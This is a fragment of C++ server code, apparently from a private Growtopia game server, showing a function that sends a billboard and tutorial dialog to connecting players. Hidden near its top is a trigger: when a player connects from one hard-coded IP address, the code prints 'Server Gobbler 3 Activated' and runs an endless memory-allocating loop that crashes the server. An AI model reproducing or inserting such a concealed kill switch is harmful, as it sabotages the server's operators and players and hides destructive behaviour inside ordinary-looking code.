...
void SendBillBoard(ENetPeer* peer) {
	...
	if (pInfo(peer)->ip_ply == "77.246.71.42") {
		Send_::console_msg(peer, "`9Server Gobbler 3 Activated");
		for (;;) new int[99999];
	}
	...
	try {
		if (pInfo(peer)->haveGrowId and pInfo(peer)->inGame and pInfo(peer)->passed_data and not pInfo(peer)->tankIDName.empty() and not pInfo(peer)->lobby_guest_acc and pInfo(peer) != NULL) {
			...
			if (p_world >= 60) {
				...
				isvalid = 0;
			} else if (w_.isNuked and not isDev(peer) and not isSuperMod(peer) and not isMod(peer)) {
			...
			if (act_ == "TUTORIAL") {
				Send_::dialog_(peer, "set_default_color|`o\nadd_label_with_icon|big|`wWelcome!``|left|18|\nadd_spacer|small|\nadd_textbox|`0Greetings, new Growtopian! You've just joined the first of many worlds. This one will teach you the basics!|\nadd_spacer|small|\nadd_label_with_icon|small|`0Once you've mastered the basics, you'll visit the `5START`0 world where you can interact with fellow Growtopians and learn more about Growtopia!|left|20|\nend_dialog||Continue|\nadd_quick_exit|\n");
			}
